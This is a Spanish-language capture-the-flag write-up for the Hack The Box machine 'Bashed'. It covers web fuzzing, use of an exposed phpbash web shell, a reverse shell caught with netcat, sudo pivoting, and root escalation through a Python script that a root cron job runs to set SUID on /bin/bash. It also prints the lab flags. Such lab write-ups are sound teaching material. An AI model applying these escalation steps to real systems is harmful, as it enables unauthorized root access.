---
tags:
title: Bashed- Easy (HTB)
permalink: /Bashed-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

`Bashed` es una m√°quina bastante `f√°cil` que se centra principalmente en la fluidez y la localizaci√≥n de archivos `importantes`. Como el acceso b√°sico al `crontab` est√° restringido, recurrimos a herramientas de monitoreo de procesos como `pspy` para poder descubrir procesos cr√≠ticos, los cuales derivan es una escalada de privilegios.
# Reconocimiento

```bash
nmap -sCV -p80 10.129.253.1                                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 04:00 -03
Nmap scan report for 10.129.253.1
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.91 seconds
```

## Website / Port 80 

![image-center](/assets/images/{94139BB4-DC2A-4265-AC7D-981BA246D82C}.png)

La web de por si no muestra nada de nada, as√≠ que sigo por `fuzzing`

### Feroxbuster enumeration

```bash
feroxbuster -u http://bashed.htb/ -x php     
                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.13.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://bashed.htb/
 üö©  In-Scope Url          ‚îÇ bashed.htb
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.13.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [php]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      306c http://bashed.htb/css => http://bashed.htb/css/
301      GET        9l       28w      309c http://bashed.htb/images => http://bashed.htb/images/
301      GET        9l       28w      305c http://bashed.htb/js => http://bashed.htb/js/
[..snip..]
200      GET      161l      397w     7743c http://bashed.htb/
200      GET      216l      489w     8151c http://bashed.htb/dev/phpbash.php
200      GET        1l      255w     4559c http://bashed.htb/dev/phpbash.min.php
200      GET        0l        0w        0c http://bashed.htb/php/sendMail.php

[######>-------------] - 86s    19613/60064   2m      found:45      errors:0      
üö® Caught ctrl+c üö® saving scan state to ferox-http_bashed_htb_-1764227325.state ...
[######>-------------] - 86s    19631/60064   2m      found:45      errors:0      
[###>----------------] - 86s     4971/30000   58/s    http://bashed.htb/ 
[####################] - 7s     30000/30000   4475/s  http://bashed.htb/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4476/s  http://bashed.htb/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4221/s  http://bashed.htb/js/ => Directory listing (add --scan-dir-listings to scan)
[###>----------------] - 74s     4784/30000   64/s    http://bashed.htb/uploads/ 
[####################] - 1s     30000/30000   35170/s http://bashed.htb/dev/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   41436/s http://bashed.htb/php/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 6s     30000/30000   5259/s  http://bashed.htb/fonts/ => Directory listing (add --scan-dir-listings to scan)
[--------------------] - 0s         0/30000   -       http://bashed.htb/js/jquery.easing.1.3.js 
[--------------------] - 0s         0/30000   -       http://bashed.htb/js/html5.js 
```

Veo un dos archivos interesantes: `phpbash.php` y `phpbash.min.php`.

### phpbash.php

En la pagina el contenido de este archivo parece ser como una especio de `gui` para una terminal de web.

![image-center](/assets/images/{749FCE72-B0E5-441C-A0ED-8C7A62F7E006}.png)

## Shell as www-data

Si ejecuto comandos se ven reflejados en la web misma.

![image-center](/assets/images/{F79A3B94-ADBE-4371-B1C7-5645000F8623}.png)

Ya directamente para evitar `delays` me envio una `shell` a mi maquina con `busybox` para tambien evitar errores.

![image-center](/assets/images/{A47C1EDD-DEB8-4061-8219-A72EE7283518}.png)

Y desde mi listener `nc` llega la shell como `www-data`.

```bash
nc -nlvp 4444       
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.253.1] 47336
whoami
www-data
```

```bash
www-data@bashed:/var/www/html$ cat /home/arrexel/user.txt 
c02eeee5fb5fd848c17d33ff7de1270f
```
## Shell as script manager

Ya una vez dentro de la maquina veo que el usuario `www-data` tiene la capacidad de ejecutar cualquier comando sin la necesidad de proporcionar una `password` como el usuario `scriptmanager`.

```bash
www-data@bashed:/var/www/html$ sudo -l 
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Por lo que puedo convertirme en el mismo usando el siguiente comando.

```bash
sudo -u scriptmanager /bin/bash
```

## Shell as root

Ya dentro de la shell como el usuario `scriptmanager` veo que tiene la capacidad de escritura en el directorio `scripts`,

```bash
find / -group scriptmanager 2>/dev/null 
/scripts
/home/scriptmanager
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.nano
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
```

El cual si reviso el contenido del mismo hay dos archivos pero que no tienen un contenido valioso para mi.

```bash
scriptmanager@bashed:/etc/cron.d$ ls /scripts
test.py  test.txt
```

Despu√©s de correr el `linpeas.sh` el cual se puede descargar desde este [enlace](https://github.com/peass-ng/PEASS-ng/releases) no descubr√≠ nada, por lo que descargue tambi√©n el `pspy` que tambi√©n se puede descargar desde este [repositorio](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1).
### pspy

Corriendo el binario, me di cuenta que por detr√°s corre una tarea `cron` la cual hace que cualquier script en `python` se ejecute con alto privilegios.

```bash
2025/11/26 23:43:01 CMD: UID=0     PID=25690  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
2025/11/26 23:43:01 CMD: UID=0     PID=25689  | /usr/sbin/CRON -f 
```
```bash
scriptmanager@bashed:/scripts$ vi shell.py
scriptmanager@bashed:/scripts$ chmod +x shell.py 
scriptmanager@bashed:/scripts$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ bash -p 
bash-4.3# cat /root/root.txt 
0b62ede391a2e65aa7d9f175d200c6f7
```

### shell.py

Por lo que se me ocurre crear un script el cual ejecute un comando el cual voy a controlar desde el mismo c√≥digo. En mi caso para hacerlo simple voy a hacer que una vez que el script corra se le asigne el bit `SUID` a la `bash`, de manera que el script final quedar√≠a as√≠.

Primero chequeamos los permisos de la `bash`.

```bash
scriptmanager@bashed:/scripts$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

Y ahora ya puedo generar el script el cual en su forma final quedar√≠a as√≠:

```python
import os 
os.system("chmod u+s /bin/bash")
```

Lo creamos en el directorio `/scripts` y esperamos que se ejecuta gracias a la tarea `cron`, y luego de unos segundos los permisos de la `bash` cambian.

```bash
scriptmanager@bashed:/scripts$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

Por lo que ya ahora me puedo convertir en `root` ejecutando el comando `bash -p` para convertir mi bash de bajos privilegios a una que tenga los `m√°ximos` privilegios del sistema.

```bash
bash-4.3# whoami
root
```

```bash
bash-4.3# cat /root/root.txt 
0b62ede391a2e65aa7d9f175d200c6f7
```

`~Happy Hacking.`